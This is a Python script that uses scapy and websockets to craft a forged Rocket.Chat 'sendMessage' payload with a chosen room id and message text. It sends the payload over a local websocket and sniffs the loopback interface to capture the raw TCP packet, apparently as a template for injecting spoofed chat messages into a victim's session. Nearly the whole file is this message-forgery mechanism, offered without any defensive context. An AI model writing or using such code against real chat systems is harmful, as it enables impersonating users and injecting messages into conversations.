# encoding=utf-8

import threading
import time
import string
import json
import websockets
import asyncio
import binascii
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *


async def websocket_serv(websocket, path):
    name = await websocket.recv()
    greeting = "OK"
    await websocket.send(greeting)


async def websocket_clin(msg):
    async with websockets.connect('ws://localhost:7777') as websocket:
        await websocket.send(msg)
        greeting = await websocket.recv()


def run_websocket_server():
    start_server = websockets.serve(websocket_serv, 'localhost', 7777)
    asyncio.get_event_loop().run_until_complete(start_server)


def run_websocket_client(msg):
    asyncio.get_event_loop().run_until_complete(websocket_clin(msg))


def forge_rocket_chat_messege(forged_id, room_id, forged_message):
    dict = {}
    dict['msg'] = 'method'
    dict['method'] = 'sendMessage'

    sub_dict = {}
    sub_dict['_id'] = ''.join(random.sample(string.ascii_letters + string.digits, len('WXgEhQYrqQphda4NW')))
    sub_dict['rid'] = room_id
    sub_dict['msg'] = forged_message
    dict['params'] = [sub_dict]
    dict['id'] = str(forged_id)
    json_str = json.dumps(dict)# .replace(' ', '')
    warp_json_str = json.dumps([json_str])

    return warp_json_str


def get_websocket_messege(forged_id=101, room_id='NGbsMyFhDp9n6JnEx', forged_message='forged message'):
    forge_msg = forge_rocket_chat_messege(forged_id, room_id, forged_message)

    t_server = threading.Thread(target=run_websocket_server)
    t_server.daemon = True
    t_server.run()

    pkts = sniff(filter="tcp and (dst port 7777) and tcp[13]=24",
                 iface='lo', count=3, timeout=1.5, started_callback=
                 lambda: run_websocket_client(forge_msg))

    return pkts[-1][3]
